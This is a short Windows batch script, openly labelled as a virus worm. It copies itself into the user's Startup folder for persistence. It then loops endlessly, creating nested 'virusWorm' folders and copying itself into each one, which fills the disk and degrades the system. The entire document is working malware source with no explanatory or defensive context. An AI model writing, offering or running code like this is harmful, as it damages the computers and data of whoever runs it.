@ECHO OFF
XCOPY "Code.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
:x
MD virusWorm
CD virusWorm
XCOPY "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Code.bat"
CD virusWorm
GOTO x